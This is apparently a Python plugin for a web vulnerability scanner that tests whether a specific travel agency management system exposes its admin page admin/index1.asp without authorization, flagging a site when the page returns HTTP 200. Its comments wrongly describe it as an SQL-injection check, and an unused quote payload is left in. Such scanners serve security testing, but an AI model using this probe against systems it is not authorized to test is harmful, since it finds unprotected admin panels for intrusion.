# -*- coding: utf-8 -*-
'''
本插件针对 仙游旅行社管理系统后台越权访问 admin/index1.asp 漏洞
author: lidq
created: 20170117
'''

#导入url请求公用库
from engine.engine_utils.InjectUrlLib import returnInjectResult

from engine.engine_utils.common import *
from engine.engine_utils.yd_http import request

#导入日志处理句柄
from engine.logger import scanLogger as logger
#导入默认的header头
from engine.engine_utils.DictData import headerDictDefault


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    #重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    headers = headerDictDefault
    headers['cookie'] = config['cookie']
    headers['Host'] = config['domain']
    source_ip = config.get('source_ip')
    responseList = []
    try:
        #使用单引号测试是否存在SQL报错，有则存在漏洞
        payload = "'"
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']
        url = urlBase + '/admin/index1.asp'
        response = request(url=url, headers=headers, method="GET")
        if response['httpcode'] == 200:
                injectInfo = returnInjectResult(url=urlBase, confirm=1, detail="仙游旅行社管理系统后台越权访问", response=response)
                responseList.append(getRecord2(scanInfo, injectInfo))
                return responseList

    except Exception,e:
        logger.exception(e)
    return responseList

